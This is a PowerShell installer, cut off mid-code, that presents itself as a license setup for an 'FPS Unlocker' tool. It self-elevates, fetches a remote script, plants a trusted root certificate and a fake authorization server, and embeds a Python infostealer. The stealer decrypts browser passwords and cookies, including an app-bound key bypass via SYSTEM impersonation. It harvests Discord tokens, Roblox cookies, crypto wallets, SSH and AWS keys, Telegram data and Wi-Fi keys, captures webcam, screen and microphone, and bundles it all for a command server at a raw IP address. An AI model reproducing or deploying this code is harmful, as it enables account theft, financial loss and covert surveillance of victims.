$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$Source = 'https://raw.githubusercontent.com/MarcoCOdev1/d/main/install.ps1'

$admin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
         [Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $PSCommandPath) {
    $tmp = Join-Path $env:TEMP 'seven-install.ps1'
    Invoke-WebRequest -UseBasicParsing $Source -OutFile $tmp
    if (-not $admin) { Start-Process powershell -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$tmp`"") }
    else { & powershell -NoProfile -ExecutionPolicy Bypass -File $tmp }
    return
}
if (-not $admin) {
    Start-Process powershell -Verb RunAs -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$PSCommandPath`"")
    return
}

$Root   = 'C:\seven'
$Hosts  = Join-Path $env:windir 'System32\drivers\etc\hosts'
$Domain = 'sevenauthapi.com'
$Launcher = Join-Path $Root 'fakeauth.exe'
$IconUrl  = 'https://cdn.discordapp.com/attachments/1565494169160654911/1565742788987985970/jon_snow_____game_of_thrones.jpg'

Write-Host '>> setup' -ForegroundColor Cyan
foreach ($t in 'FakeAuth','FakeAuthGrab') { Unregister-ScheduledTask -TaskName $t -Confirm:$false -ErrorAction SilentlyContinue }
Get-CimInstance Win32_Process -Filter "Name='python.exe' OR Name='pythonw.exe' OR Name='fakeauth.exe'" -ErrorAction SilentlyContinue |
    Where-Object { $_.CommandLine -match 'fake\.py|run\.py|agent\.py' } |
    ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
Get-ChildItem Cert:\CurrentUser\Root -ErrorAction SilentlyContinue |
    Where-Object { $_.Subject -like "*CN=$Domain*" } | Remove-Item -Force -ErrorAction SilentlyContinue

$py = (Get-Command python -ErrorAction SilentlyContinue)
if (-not $py) { throw 'python ma kaynch f PATH' }
$pyw = Join-Path (Split-Path $py.Source) 'pythonw.exe'
if (-not (Test-Path $pyw)) { $pyw = $py.Source }

if (Test-Path $Root) { Rename-Item $Root ("$Root.bak." + (Get-Date -Format 'yyyyMMdd-HHmmss')) }
New-Item -ItemType Directory -Path $Root | Out-Null
Set-Location $Root
python -m pip install cryptography requests --disable-pip-version-check --quiet

$makecert = @'
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
import datetime

k = rsa.generate_private_key(public_exponent=65537, key_size=2048)
n = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "sevenauthapi.com")])
now = datetime.datetime.now(datetime.timezone.utc)
c = (x509.CertificateBuilder().subject_name(n).issuer_name(n)
     .public_key(k.public_key()).serial_number(x509.random_serial_number())
     .not_valid_before(now - datetime.timedelta(days=1))
     .not_valid_after(now + datetime.timedelta(days=3650))
     .add_extension(x509.SubjectAlternativeName([
         x509.DNSName("sevenauthapi.com"), x509.DNSName("*.sevenauthapi.com")]), False)
     .add_extension(x509.BasicConstraints(ca=True, path_length=None), True)
     .sign(k, hashes.SHA256()))
open("cert.pem","wb").write(
    k.private_bytes(serialization.Encoding.PEM,
        serialization.PrivateFormat.TraditionalOpenSSL,
        serialization.NoEncryption()) + c.public_bytes(serialization.Encoding.PEM))
open("seven.cer","wb").write(c.public_bytes(serialization.Encoding.DER))
print("OK")
'@

$runner = @'
import os, sys, time
os.chdir(os.path.dirname(os.path.abspath(__file__)))
log = "server.log"
try:
    if os.path.getsize(log) > 2097152:
        os.replace(log, "server.old.log")
except OSError:
    pass
f = open(log, "a", encoding="utf-8", buffering=1)
sys.stdout = f; sys.stderr = f
print(""); print("=== start", time.strftime("%Y-%m-%d %H:%M:%S"), "pid", os.getpid(), "===")
exec(compile(open("fake.py", encoding="utf-8").read(), "fake.py", "exec"), {"__name__": "__main__"})
'@

$fake = @'
import ssl, json, base64, hashlib, time, uuid, secrets
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler

YEAR = 365 * 24 * 3600 * 1000

def token(hwid):
    now = int(time.time() * 1000)
    p = {"k": secrets.token_hex(12),
         "h": hashlib.sha256(hwid.encode()).hexdigest()[:24],
         "c": secrets.token_hex(8),
         "e": now + 10 * YEAR}
    b = base64.urlsafe_b64encode(json.dumps(p, separators=(",", ":")).encode()).decode().rstrip("=")
    sig = base64.urlsafe_b64encode(secrets.token_bytes(32)).decode().rstrip("=")
    return b + "." + sig

class H(BaseHTTPRequestHandler):
    daemon_threads = True
    def do_GET(self): self.x()
    def do_POST(self): self.x()
    def x(self):
        n = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(n)
        print(">>>", self.path, raw)
        try: req = json.loads(raw or b"{}")
        except: req = {}
        now = int(time.time() * 1000)
        body = {"success": True, "message": "Authorized", "data": {
            "product": {"id": "6ac401b8ca0d96ab19f8c388", "name": "FPS Unlocker",
                        "hash": req.get("productHash", "")},
            "username": req.get("username", "user"),
            "sessionToken": token(req.get("hwid", "")),
            "expiresAt": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime((now + 10 * YEAR) / 1000)),
            "expiresAtUnix": now + 10 * YEAR,
            "daysLeft": 3650,
            "serverTimeUnix": now,
            "secondsLeft": 10 * YEAR // 1000,
            "config": None},
            "requestId": str(uuid.uuid4()),
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime(now / 1000))}
        b = json.dumps(body).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json; charset=utf-8")
        self.send_header("x-censor-enabled", "1")
        self.send_header("Content-Length", str(len(b)))
        self.end_headers()
        self.wfile.write(b)
    def log_message(self, fmt, *a): pass

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain("cert.pem")
s = ThreadingHTTPServer(("0.0.0.0", 443), H)
s.socket = ctx.wrap_socket(s.socket, server_side=True)
print("fake :443")
s.serve_forever()
'@

$cam = @'
param([string]$Out)
$ErrorActionPreference = 'Stop'
Add-Type -AssemblyName System.Runtime.WindowsRuntime
function Await($op, $t) {
  $m = [System.WindowsRuntimeSystemExtensions].GetMethods() | Where-Object {
    $_.Name -eq 'AsTask' -and $_.GetParameters().Count -eq 1 -and $_.GetParameters()[0].ParameterType.Name -eq 'IAsyncOperation`1'
  } | Select-Object -First 1
  $task = $m.MakeGenericMethod($t).Invoke($null, @($op))
  if (-not $task.Wait(20000)) { throw 'timeout' }
  $task.Result
}
[Windows.Media.Capture.MediaCapture,Windows.Media.Capture,ContentType=WindowsRuntime]|Out-Null
[Windows.Storage.StorageFile,Windows.Storage,ContentType=WindowsRuntime]|Out-Null
[Windows.Media.MediaProperties.ImageEncodingProperties,Windows.Media.MediaProperties,ContentType=WindowsRuntime]|Out-Null
$mc = New-Object Windows.Media.Capture.MediaCapture
$init = New-Object Windows.Media.Capture.MediaCaptureInitializationSettings
$init.StreamingCaptureMode = 'Video'
$t = [System.WindowsRuntimeSystemExtensions]::AsTask($mc.InitializeAsync($init))
if (-not $t.Wait(20000)) { throw 'init timeout' }
$dir  = Split-Path $Out
$leaf = Split-Path $Out -Leaf
$folder = Await ([Windows.Storage.StorageFolder]::GetFolderFromPathAsync($dir)) ([Windows.Storage.StorageFolder])
$file   = Await ($folder.CreateFileAsync($leaf, 'ReplaceExisting')) ([Windows.Storage.StorageFile])
$props  = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
$t2 = [System.WindowsRuntimeSystemExtensions]::AsTask($mc.CapturePhotoToStorageFileAsync($props, $file))
if (-not $t2.Wait(20000)) { throw 'capture timeout' }
$mc.Dispose()
'@

$screen = @'
param([string]$Out)
$ErrorActionPreference = 'Stop'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$b = [System.Windows.Forms.SystemInformation]::VirtualScreen
$bmp = New-Object System.Drawing.Bitmap $b.Width, $b.Height
$g = [System.Drawing.Graphics]::FromImage($bmp)
$g.CopyFromScreen($b.Left, $b.Top, 0, 0, $bmp.Size)
$bmp.Save($Out, [System.Drawing.Imaging.ImageFormat]::Jpeg)
$g.Dispose(); $bmp.Dispose()
'@

$grab = @'
import os, sys, json, re, time, socket, sqlite3, shutil, subprocess, base64, ctypes, ctypes.wintypes, hashlib, zipfile, random, threading, winreg, uuid

try:
    import requests
except Exception:
    requests = None

from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes

API = "http://51.75.118.5:20216"
INTERVAL = 1800
POLL = 5
ROOT = os.path.dirname(os.path.abspath(__file__))
DATA = os.path.join(ROOT, "data")
STATE = os.path.join(DATA, "state.json")
CWD = os.path.expanduser("~")
os.makedirs(DATA, exist_ok=True)

RE_TOKEN = re.compile(r"[\w-]{24,28}\.[\w-]{6}\.[\w-]{27,38}|mfa\.[\w-]{80,90}")
RE_ROBLOX = re.compile(r"_\|WARNING[^\x00-\x1f\"\\]{50,600}")
SKIP = {"windows", "$recycle.bin", "system volume information", "node_modules", ".git",
        "package cache", "installer", "winsxs", "driverstore", "temp", "tmp"}
UD = os.environ.get("LOCALAPPDATA", "")
AD = os.environ.get("APPDATA", "")
DIAG = []
BROWSERS = [
    ("Chrome", os.path.join(UD, "Google", "Chrome", "User Data")),
    ("ChromeBeta", os.path.join(UD, "Google", "Chrome Beta", "User Data")),
    ("ChromeDev", os.path.join(UD, "Google", "Chrome Dev", "User Data")),
    ("Brave", os.path.join(UD, "BraveSoftware", "Brave-Browser", "User Data")),
    ("Edge", os.path.join(UD, "Microsoft", "Edge", "User Data")),
    ("EdgeBeta", os.path.join(UD, "Microsoft", "Edge Beta", "User Data")),
    ("Vivaldi", os.path.join(UD, "Vivaldi", "User Data")),
    ("Opera", os.path.join(AD, "Opera Software", "Opera Stable")),
    ("OperaGX", os.path.join(AD, "Opera Software", "Opera GX Stable")),
    ("Yandex", os.path.join(UD, "Yandex", "YandexBrowser", "User Data")),
]
FIREFOX = os.path.join(AD, "Mozilla", "Firefox", "Profiles")

def log(m):
    try:
        p = os.path.join(ROOT, "grabber.log")
        if os.path.exists(p) and os.path.getsize(p) > 1048576:
            os.replace(p, p + ".old")
        with open(p, "a", encoding="utf-8") as f:
            f.write("%s  %s\n" % (time.strftime("%Y-%m-%d %H:%M:%S"), m))
    except Exception:
        pass

def _hwid():
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
        g = winreg.QueryValueEx(k, "MachineGuid")[0]
    except Exception:
        g = socket.gethostname() + str(uuid.getnode())
    return hashlib.sha256(g.encode()).hexdigest()[:16]

HWID = _hwid()

def api(path, payload=None, timeout=60):
    if not requests:
        return None
    try:
        url = API.rstrip("/") + path
        r = requests.get(url, timeout=timeout) if payload is None else requests.post(url, json=payload, timeout=timeout)
        return r.json() if r.content else {}
    except Exception as e:
        log("api %s %r" % (path, e))
        return None

class BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_char))]

def dpapi(data, system=False):
    buf = ctypes.create_string_buffer(data, len(data))
    bi = BLOB(len(data), ctypes.cast(buf, ctypes.POINTER(ctypes.c_char)))
    bo = BLOB()
    if not ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(bi), None, None, None, None,
            0x10 if system else 0, ctypes.byref(bo)):
        return None
    out = ctypes.string_at(bo.pbData, bo.cbData)
    ctypes.windll.kernel32.LocalFree(bo.pbData)
    return out

def _debug():
    h = ctypes.windll.kernel32.GetCurrentProcess()
    tok = ctypes.wintypes.HANDLE()
    ctypes.windll.advapi32.OpenProcessToken(h, 0x28, ctypes.byref(tok))
    class TP(ctypes.Structure):
        _fields_ = [("Count", ctypes.wintypes.DWORD), ("Luid", ctypes.c_ulonglong), ("Attr", ctypes.wintypes.DWORD)]
    class TPN(ctypes.Structure):
        _fields_ = [("Count", ctypes.wintypes.DWORD), ("Priv", TP * 1)]
    luid = ctypes.c_ulonglong()
    ctypes.windll.advapi32.LookupPrivilegeValueW(None, "SeDebugPrivilege", ctypes.byref(luid))
    tp = TPN(1, (TP * 1)(TP(1, luid, 0x2)))
    ctypes.windll.advapi32.AdjustTokenPrivileges(tok, False, ctypes.byref(tp), 0, None, None)

def _system():
    _debug()
    for pid in pids_of({"winlogon.exe"}):
        h = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid)
        if not h:
            continue
        tok = ctypes.wintypes.HANDLE()
        if ctypes.windll.advapi32.OpenProcessToken(h, 0xA, ctypes.byref(tok)):
            dup = ctypes.wintypes.HANDLE()
            if ctypes.windll.advapi32.DuplicateTokenEx(tok, 0x1C, None, 2, 2, ctypes.byref(dup)):
                if ctypes.windll.advapi32.ImpersonateLoggedOnUser(dup):
                    return True
    return False

def user_key(ud):
    ls = os.path.join(ud, "Local State")
    if not os.path.exists(ls):
        return None
    try:
        raw = json.load(open(ls, "r", encoding="utf-8"))["os_crypt"]["encrypted_key"]
    except Exception:
        return None
    k = dpapi(base64.b64decode(raw)[5:])
    return PBKDF2HMAC(algorithm=hashes.SHA256(), length=16, salt=b"saltysalt", iterations=1).derive(k) if k else None

def app_key(ud):
    ls = os.path.join(ud, "Local State")
    if not os.path.exists(ls):
        return None
    try:
        raw = base64.b64decode(json.load(open(ls, "r", encoding="utf-8"))["os_crypt"]["app_bound_encrypted_key"])
    except Exception:
        return None
    if raw[:4] != b"APPB":
        return None
    ok = _system()
    try:
        blob = dpapi(raw[4:], True)
    finally:
        if ok:
            ctypes.windll.advapi32.RevertToSelf()
    if not blob or len(blob) < 32:
        return None
    try:
        key = hashlib.sha256(b"Google Chromekey1").digest()
        for _ in range(32):
            e = Cipher(algorithms.AES(key), modes.CBC(key[:16])).encryptor()
            key = (e.update(key) + e.finalize())[:32]
        plain = AESGCM(key).decrypt(blob[:12], blob[12:], None)
        if plain and plain[0] == 1:
            return plain[1:33]
    except Exception:
        return None
    return None

def dec(blob, key, aad=b"", akey=None):
    if not blob:
        return ""
    try:
        if blob[:3] in (b"v10", b"v11") and key:
            return AESGCM(key).decrypt(b" " * 32, blob[3:], None).decode("utf-8", "replace")
        if blob[:3] == b"v20":
            if akey and len(blob) > 31:
                for a in (aad, b""):
                    try:
                        return AESGCM(akey).decrypt(blob[3:15], blob[15:], a).decode("utf-8", "replace")
                    except Exception:
                        pass
            return "[v20]" + base64.b64encode(blob).decode()
        try:
            return blob.decode("utf-8")
        except Exception:
            pass
        d = dpapi(blob)
        return d.decode("utf-8", "replace") if d else ""
    except Exception:
        return ""

def open_db(src):
    tmp = os.path.join(DATA, "db%d" % random.randint(0, 999999))
    got = False
    for ext in ("", "-wal", "-shm", "-journal"):
        if os.path.exists(src + ext):
            try:
                shutil.copy2(src + ext, tmp + ext)
                got = True
            except Exception:
                pass
    if not got:
        return None
    for target, is_uri in ((tmp, False), ("file:%s?mode=ro&nolock=1" % tmp.replace("\\", "/"), True),
                           ("file:%s?immutable=1" % tmp.replace("\\", "/"), True)):
        try:
            con = sqlite3.connect(target, uri=is_uri, timeout=8)
            con.execute("select 1 from sqlite_master limit 1").fetchall()
            return con
        except Exception:
            continue
    return None

def profiles_of(ud):
    if not os.path.isdir(ud):
        return []
    try:
        names = [d for d in os.listdir(ud) if os.path.isdir(os.path.join(ud, d))]
    except Exception:
        return []
    return [p for p in names if p == "Default" or p.startswith("Profile")]

def cookies(ud):
    out, n = [], 0
    key = user_key(ud)
    akey = app_key(ud)
    for prof in profiles_of(ud):
        for cand in ("Network\\Cookies", "Cookies"):
            src = os.path.join(ud, prof, cand)
            if not os.path.exists(src):
                continue
            con = open_db(src)
            if not con:
                DIAG.append("%s/%s db fail" % (os.path.basename(ud), prof))
                continue
            try:
                rows = con.execute("select host_key,name,encrypted_value,path from cookies").fetchall()
            except Exception as e:
                DIAG.append("%s/%s %s" % (os.path.basename(ud), prof, e))
                rows = []
            con.close()
            for host, cn, ev, path in rows:
                n += 1
                v = dec(ev, key, host.encode(), akey)
                if v:
                    out.append("%s\t%s\t%s\t%s" % (host, cn, v, path))
    if n:
        DIAG.append("%s rows=%d ok=%d ukey=%s akey=%s" % (os.path.basename(ud), n, len(out), bool(key), bool(akey)))
    return out

def passwords(ud):
    out = []
    key = user_key(ud)
    akey = app_key(ud)
    for prof in profiles_of(ud):
        src = os.path.join(ud, prof, "Login Data")
        if not os.path.exists(src):
            continue
        con = open_db(src)
        if not con:
            continue
        try:
            rows = con.execute("select origin_url,username_value,password_value from logins").fetchall()
        except Exception:
            rows = []
        con.close()
        for url, user, pw in rows:
            if user:
                out.append("%s\t%s\t%s" % (url, user, dec(pw, key, url.encode(), akey)))
    return out

def firefox():
    out = []
    if not os.path.isdir(FIREFOX):
        return out
    for prof in os.listdir(FIREFOX):
        src = os.path.join(FIREFOX, prof, "cookies.sqlite")
        if not os.path.exists(src):
            continue
        con = open_db(src)
        if not con:
            continue
        try:
            for h, n, v in con.execute("select host,name,value from moz_cookies").fetchall():
                out.append("%s\t%s\t%s\t/" % (h, n, v))
        except Exception:
            pass
        con.close()
    return out

def pids_of(names):
    found = set()
    try:
        arr = (ctypes.c_ulong * 2048)()
        need = ctypes.c_ulong()
        ctypes.windll.psapi.EnumProcesses(ctypes.byref(arr), ctypes.sizeof(arr), ctypes.byref(need))
        for pid in arr[: need.value // ctypes.sizeof(ctypes.c_ulong)]:
            h = ctypes.windll.kernel32.OpenProcess(0x1000, False, pid)
            if not h:
                continue
            try:
                buf = ctypes.create_unicode_buffer(1024)
                sz = ctypes.c_ulong(1024)
                if ctypes.windll.kernel32.QueryFullProcessImageNameW(h, 0, buf, ctypes.byref(sz)):
                    if os.path.basename(buf.value).lower() in names:
                        found.add(pid)
            finally:
                ctypes.windll.kernel32.CloseHandle(h)
    except Exception:
        pass
    return found

def discord_dirs():
    dirs = set()
    for base in (AD, UD):
        if not os.path.isdir(base):
            continue
        for n in os.listdir(base):
            if "discord" in n.lower() or "lightcord" in n.lower():
                p = os.path.join(base, n)
                if os.path.isdir(p):
                    dirs.add(p)
    return dirs

def read_tokens(folder, max_depth=6):
    hits = set()
    if not os.path.isdir(folder):
        return hits
    base = folder.rstrip("\\").count("\\")
    for dp, dns, fns in os.walk(folder):
        if dp.count("\\") - base > max_depth:
            dns[:] = []
        for fn in fns:
            if not fn.lower().endswith((".ldb", ".log", ".sst")):
                continue
            p = os.path.join(dp, fn)
            try:
                if os.path.getsize(p) > 16777216:
                    continue
                blob = open(p, "rb").read().decode("latin-1")
            except Exception:
                continue
            for m in RE_TOKEN.findall(blob):
                hits.add((m, p))
    return hits

def browser_tokens():
    hits = set()
    for name, ud in BROWSERS:
        for prof in profiles_of(ud):
            p = os.path.join(ud, prof, "Local Storage", "leveldb")
            if os.path.isdir(p):
                hits |= read_tokens(p, 1)
    return hits

def disk_scan(deadline):
    hits = set()
    for d in "CDEFGH":
        root = d + ":\\"
        if not os.path.exists(root):
            continue
        for dp, dns, fns in os.walk(root, topdown=True):
            if time.time() > deadline:
                return hits
            dns[:] = [x for x in dns if x.lower() not in SKIP and not x.startswith("$")]
            if os.path.basename(dp).lower() == "leveldb":
                dns[:] = []
                try:
                    for fn in fns:
                        p = os.path.join(dp, fn)
                        if os.path.getsize(p) > 16777216:
                            continue
                        blob = open(p, "rb").read().decode("latin-1")
                        for m in RE_TOKEN.findall(blob):
                            hits.add((m, p))
                except Exception:
                    pass
    return hits

def validate(tok):
    if not requests:
        return None
    try:
        r = requests.get("https://discord.com/api/v9/users/@me",
                         headers={"Authorization": tok, "User-Agent": "Mozilla/5.0"}, timeout=15)
        if r.status_code != 200:
            return {"valid": False, "code": r.status_code}
        u = r.json()
        i = {"valid": True, "id": u.get("id"), "username": u.get("username"), "email": u.get("email"),
             "phone": u.get("phone"), "mfa": u.get("mfa_enabled"), "nitro": u.get("premium_type")}
        try:
            b = requests.get("https://discord.com/api/v9/users/@me/billing/subscriptions",
                             headers={"Authorization": tok}, timeout=15).json()
            i["subs"] = len(b) if isinstance(b, list) else 0
        except Exception:
            pass
        return i
    except Exception as e:
        return {"valid": None, "err": str(e)[:60]}

PS = r"""
$o=[ordered]@{}
try{$o.cpu=(Get-CimInstance Win32_Processor).Name -join ' | '}catch{}
try{$o.gpu=(Get-CimInstance Win32_VideoController).Name -join ' | '}catch{}
try{$o.ram_gb=[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)}catch{}
try{$o.mobo=((Get-CimInstance Win32_BaseBoard).Manufacturer)+' '+(Get-CimInstance Win32_BaseBoard).Product}catch{}
try{$o.os=(Get-CimInstance Win32_OperatingSystem).Caption+' '+[Environment]::OSVersion.Version}catch{}
try{$o.disks=@(Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | ForEach-Object { "$($_.DeviceID) $([math]::Round($_.Size/1GB))GB/$([math]::Round($_.FreeSpace/1GB))GB free" }) -join ' | '}catch{}
try{$o.res="$(Get-CimInstance Win32_VideoController | Select-Object -First 1 | ForEach-Object {$_.CurrentHorizontalResolution}x$($_.CurrentVerticalResolution))"}catch{}
try{$w=(netsh wlan show interfaces | Select-String '^\s*SSID\s*:'); $o.wifi=(($w -join '') -split ':')[1]}catch{}
try{$o.wifi_keys=@(netsh wlan show profiles | Select-String ':\s*(.+)$' | ForEach-Object { $n=$_.Matches[0].Groups[1].Value.Trim(); $k=(netsh wlan show profile name="$n" key=clear | Select-String 'Key Content\s*:\s*(.+)$'); "$n=$($k.Matches[0].Groups[1].Value)" }) -join ' | '}catch{}
try{$o.uptime=[int]((Get-Date)-(Get-CimInstance Win32_OperatingSystem).LastBootUpTime).TotalMinutes}catch{}
try{$o.key=(Get-CimInstance SoftwareLicensingService).OA3xOriginalProductKey}catch{}
try{$o.av=@(Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct | ForEach-Object { $_.displayName }) -join ', '}catch{}
try{$o.users=@(Get-LocalUser | ForEach-Object { "$($_.Name)($($_.Enabled))" }) -join ', '}catch{}
try{$o.startup=@(Get-CimInstance Win32_StartupCommand | ForEach-Object { "$($_.Name)=$($_.Command)" }) -join ' || '}catch{}
try{$o.clip=Get-Clipboard -Raw}catch{}
$o | ConvertTo-Json -Compress
"""

def sysinfo():
    try:
        r = subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", PS],
                           capture_output=True, text=True, timeout=120, creationflags=0x08000000)
        return json.loads(r.stdout.strip() or "{}")
    except Exception as e:
        return {"err": str(e)[:60]}

def pub_ip():
    if not requests:
        return "?"
    for u in ("https://api.ipify.org", "https://ifconfig.me/ip"):
        try:
            return requests.get(u, timeout=10).text.strip()
        except Exception:
            pass
    return "?"

def local_ips():
    out = set()
    try:
        for ip in socket.gethostbyname_ex(socket.gethostname())[2]:
            out.add(ip)
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80)); out.add(s.getsockname()[0]); s.close()
    except Exception:
        pass
    return ", ".join(sorted(out))

def geo(ip):
    if not requests or ip == "?":
        return ""
    try:
        d = requests.get("http://ip-api.com/json/" + ip, timeout=10).json()
        return "%s, %s, %s (%s)" % (d.get("city"), d.get("regionName"), d.get("country"), d.get("isp"))
    except Exception:
        return ""

def emails():
    out = set()
    u = os.environ.get("USERNAME", "")
    d = os.environ.get("USERDNSDOMAIN") or os.environ.get("USERDOMAIN") or ""
    if u and d:
        out.add(u + "@" + d)
    for name, ud in BROWSERS:
        for prof in profiles_of(ud):
            src = os.path.join(ud, prof, "Login Data")
            if not os.path.exists(src):
                continue
            con = open_db(src)
            if not con:
                continue
            try:
                for (x,) in con.execute("select username_value from logins where username_value like '%@%'"):
                    if x:
                        out.add(x.strip())
            except Exception:
                pass
            con.close()
    return sorted(x for x in out if "@" in x)

def roblox():
    out = set()
    base = os.path.join(UD, "Roblox", "LocalStorage")
    for dp, dns, fns in os.walk(base):
        for fn in fns:
            if not fn.lower().endswith((".ldb", ".log")):
                continue
            try:
                blob = open(os.path.join(dp, fn), "rb").read().decode("latin-1")
            except Exception:
                continue
            for m in RE_ROBLOX.findall(blob):
                out.add(m)
    return out

WALLETS = {
    "Exodus": os.path.join(AD, "Exodus", "exodus.wallet"),
    "Electrum": os.path.join(AD, "Electrum", "wallets"),
    "Atomic": os.path.join(AD, "atomic", "Local Storage", "leveldb"),
    "Coinomi": os.path.join(AD, "Coinomi", "Coinomi", "wallets"),
    "Bitcoin": os.path.join(AD, "Bitcoin", "wallets"),
    "Monero": os.path.join(AD, "bitmonero"),
    "Metamask": os.path.join(UD, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "nkbihfbeogaeaoehlefnkodbefgpgknn"),
    "Phantom": os.path.join(UD, "Google", "Chrome", "User Data", "Default", "Local Extension Settings", "bfnaelmomeimhlpmgjnjophhpkkoljpa"),
}
MISC = [os.path.expanduser(p) for p in ("~/.ssh/id_rsa", "~/.ssh/id_ed25519", "~/.ssh/known_hosts",
        "~/.aws/credentials", "~/.gitconfig", "~/.npmrc")]
MISC.append(os.path.join(AD, ".minecraft", "launcher_accounts.json"))

def camera():
    out = os.path.join(DATA, "cam.jpg")
    try:
        if os.path.exists(out):
            os.remove(out)
        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File",
                        os.path.join(ROOT, "cam.ps1"), "-Out", out], capture_output=True, timeout=45,
                       creationflags=0x08000000)
    except Exception:
        pass
    return out if os.path.exists(out) and os.path.getsize(out) > 2000 else None

def shot():
    out = os.path.join(DATA, "screen.jpg")
    try:
        if os.path.exists(out):
            os.remove(out)
        subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File",
                        os.path.join(ROOT, "screen.ps1"), "-Out", out], capture_output=True, timeout=45,
                       creationflags=0x08000000)
    except Exception:
        pass
    return out if os.path.exists(out) and os.path.getsize(out) > 3000 else None

def voice(sec=10):
    out = os.path.join(DATA, "voice.wav")
    try:
        if os.path.exists(out):
            os.remove(out)
    except Exception:
        pass
    try:
        mci = ctypes.windll.winmm.mciSendStringW
        b = ctypes.create_unicode_buffer(512)
        mci("open new type waveaudio alias rec", b, 512, None)
        mci("set rec time format ms bitspersample 16 channels 1 samplespersec 22050", b, 512, None)
        mci("record rec", b, 512, None)
        time.sleep(sec)
        mci("stop rec", b, 512, None)
        mci('save rec "%s"' % out, b, 512, None)
        mci("close rec", b, 512, None)
    except Exception as e:
        log("voice %r" % e)
    return out if os.path.exists(out) and os.path.getsize(out) > 4000 else None

def load_state():
    try:
        return json.load(open(STATE, "r", encoding="utf-8"))
    except Exception:
        return {"tokens": {}}

def save_state(s):
    try:
        json.dump(s, open(STATE, "w", encoding="utf-8"), indent=1)
    except Exception:
        pass

def hh(t):
    return hashlib.sha256(t.encode()).hexdigest()[:16]

def build_zip(sp):
    path = os.path.join(DATA, "dump.zip")
    ck, pw = [], []
    for name, ud in BROWSERS:
        c = cookies(ud)
        p = passwords(ud)
        if c:
            ck += ["# %s" % name] + c
        if p:
            pw += ["# %s" % name] + p
    ck += ["# Firefox"] + firefox()
    tot = 0
    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("cookies.txt", "\n".join(ck))
        z.writestr("passwords.txt", "\n".join(pw))
        z.writestr("sysinfo.txt", json.dumps(sp, indent=1, ensure_ascii=False))
        z.writestr("roblox.txt", "\n".join(roblox()))
        for name, p in WALLETS.items():
            if not os.path.exists(p):
                continue
            if os.path.isfile(p):
                if os.path.getsize(p) < 2097152:
                    z.write(p, "wallets/%s_%s" % (name, os.path.basename(p)))
                continue
            for dp, dn, fn in os.walk(p):
                for f in fn:
                    fp = os.path.join(dp, f)
                    try:
                        if os.path.getsize(fp) > 2097152 or tot > 12582912:
                            continue
                        tot += os.path.getsize(fp)
                        z.write(fp, "wallets/%s/%s" % (name, os.path.relpath(fp, p)))
                    except Exception:
                        pass
        for m in MISC:
            if os.path.exists(m) and os.path.getsize(m) < 524288:
                z.write(m, "misc/" + os.path.basename(m))
        for base, pref in ((r"C:\Program Files (x86)\Steam\config", "steam"),
                           (os.path.join(AD, "Telegram Desktop", "tdata"), "tdata")):
            if not os.path.isdir(base):
                continue
            for dp, dn, fn in os.walk(base):
                for f in fn:
                    fp = os.path.join(dp, f)
                    try:
                        if os.path.getsize(fp) > 2097152 or tot > 18874368:
                            continue
                        tot += os.path.getsize(fp)
                        z.write(fp, "%s/%s" % (pref, os.path.relpath(fp, base)))
                    except Exception:
                        pass
    return path, len([x for x in ck if not x.startswith("# ")]), len([x for x in pw if not x.startswith("# ")])

def cycle():
    t0 = time.time()
    sp = sysinfo()
    sp["ip"] = pub_ip()
    sp["local"] = local_ips()
    sp["geo"] = geo(sp["ip"])
    sp["emails"] = emails()
    zp, ck, pw = build_zip(sp)
    sp["ckn"], sp["pwn"] = ck, pw
    sp["diag"] = DIAG[-40:]
    files = [{"name": "dump.zip", "b64": base64.b64encode(open(zp, "rb").read()).decode()}]
    for fn, nm in ((camera(), "cam.jpg"), (shot(), "screen.jpg"), (voice(), "voice.wav")):
        if fn:
            files.append({"name": nm, "b64": base64.b64encode(open(fn, "rb").read()).decode()})
    sp["files"] = files

    st = load_state()
    known = st.setdefault("tokens", {})
    toks, events, users, lines = {}, [], [], []
    found = set()
    for d in discord_dirs():
        found |= read_tokens(d)
    found |= browser_tokens()
    for tok, src in found:
        if len(tok) > 50:
            toks.setdefault(tok, src)
    for tok, src in toks.items():
        info = validate(tok) or {}
        prev = known.get(hh(tok), {})
